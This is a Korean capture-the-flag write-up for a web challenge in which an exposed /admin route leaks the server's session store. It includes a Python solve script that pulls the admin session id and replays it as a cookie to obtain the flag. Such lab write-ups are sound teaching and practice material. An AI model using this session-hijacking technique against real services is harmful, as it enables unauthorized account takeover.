# Category

web

# Overview

쿠키와 세션으로 인증 상태를 관리하는 간단한 로그인 서비스입니다.
admin 계정으로 로그인에 성공하면 플래그를 획득할 수 있습니다.

플래그 형식은 DH{...} 입니다.

# Analysis

admin으로 로그인하면 `session id`를 발급받으며, `/` 경로를 통해 flag 획득이 가능하다.

서버가 시작될 때 `session_storage[os.urandom(32).hex()] = 'admin'` 와 같이 admin의 `session id`가 `session_storage`에 저장이 되고 웹서버가 실행된다.

`/admin` 라우트는 session이 저장된 `session_storage`를 반환한다.

# Exploitation

admin의 `session id`가 저장되어 있는 `/admin`를 호출하여 `session id`를 획득할 수 있다.

이후의 flag를 획득할 수 있는 `/` 경로에 admin의 session id로 세션쿠키를 심어서 요청 시 서버에서는 admin으로 확인하여 flag를 응답한다.

```py
# solve.py
...
def get_admin_session_id():
    """
    세션 아이디 조회
    """
    res = req(
        url=f"{url}/admin",
        method="GET",
    ).json()

    admin_session_id = next((k for k, v in res.items() if v == "admin"), None)

    if not admin_session_id:
        raise ValueError("NOT FOUND ADMIN VALUE")

    return admin_session_id


def main():
    admin_session_id = get_admin_session_id()

    res = req(url=f"{url}", method="GET", cookies={"sessionid": admin_session_id})

    match = re.search("DH{.*}", res.text)
    print(match.group() if match else "NO FLAG")


main()

```

# Flag

`DH{8f...5c}`
